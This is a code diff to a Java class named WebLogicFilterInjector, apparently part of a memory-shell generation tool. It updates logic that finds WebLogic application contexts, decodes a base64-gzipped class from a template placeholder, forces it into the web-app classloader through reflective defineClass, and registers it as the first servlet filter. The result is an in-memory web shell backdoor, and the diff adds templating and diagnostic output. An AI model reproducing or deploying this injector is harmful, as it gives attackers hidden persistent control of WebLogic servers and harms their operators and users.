@@ -4,6 +4,7 @@ import javax.management.MBeanServer;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -14,38 +15,67 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class WebLogicFilterInjector {
 
-    private static String urlPattern;
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public WebLogicFilterInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                    loadShell(context);
-                    inject(context);
-                } catch (Throwable ignored) {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     /**
@@ -53,7 +83,6 @@ public class WebLogicFilterInjector {
      * /opt/oracle/wls1036/server/lib/weblogic.jar
      * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
      */
-    @SuppressWarnings("unchecked")
     public static Set<Object> getContext() throws Exception {
         Set<Object> webappContexts = new HashSet<Object>();
         MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
@@ -95,30 +124,36 @@ public class WebLogicFilterInjector {
     }
 
     @SuppressWarnings("all")
-    private void loadShell(Object context) throws Exception {
+    private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        clazz.newInstance();
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     @SuppressWarnings("unchecked")
-    private void inject(Object context) throws Exception {
+    public void inject(Object context, Object filter) throws Exception {
         Object filterManager = invokeMethod(context, "getFilterManager", null, null);
-        if (((Map<?, ?>) getFieldValue(filterManager, "filters")).containsKey(shellClassName)) {
+        if (((Map) getFieldValue(filterManager, "filters")).containsKey(getClassName())) {
                 return;
         }
-        invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{shellClassName, shellClassName, new String[]{urlPattern}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
+        invokeMethod(filterManager, "registerFilter", new Class[]{String.class, String.class, String[].class, String[].class, Map.class, String[].class}, new Object[]{getClassName(), getClassName(), new String[]{getUrlPattern()}, null, null, new String[]{"REQUEST", "FORWARD", "INCLUDE", "ERROR"}});
         List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
         Object curFilterInfo = filterPatternList.remove(filterPatternList.size() - 1);
         filterPatternList.add(0, curFilterInfo);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -189,5 +224,20 @@ public class WebLogicFilterInjector {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
